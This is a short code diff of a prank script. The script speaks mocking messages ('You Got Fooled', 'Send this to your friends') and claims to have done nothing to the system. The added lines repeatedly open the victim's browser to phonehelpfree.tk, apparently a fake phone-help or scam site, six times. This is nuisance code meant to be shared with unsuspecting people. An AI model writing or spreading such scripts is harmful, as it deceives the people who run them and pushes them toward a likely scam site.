@@ -39,3 +39,11 @@ say "Lel Haha You Got Fooled "
 say "LolSend this to your friends"
 say "Yes"
 say "We did not do anything to your system  smiley face"
+say "Be Careful Next Time!"
+echo "Be careful next time!"
+x-www-browser http://phonehelpfree.tk/
+x-www-browser http://phonehelpfree.tk/
+x-www-browser http://phonehelpfree.tk/
+x-www-browser http://phonehelpfree.tk/
+x-www-browser http://phonehelpfree.tk/
+x-www-browser http://phonehelpfree.tk/
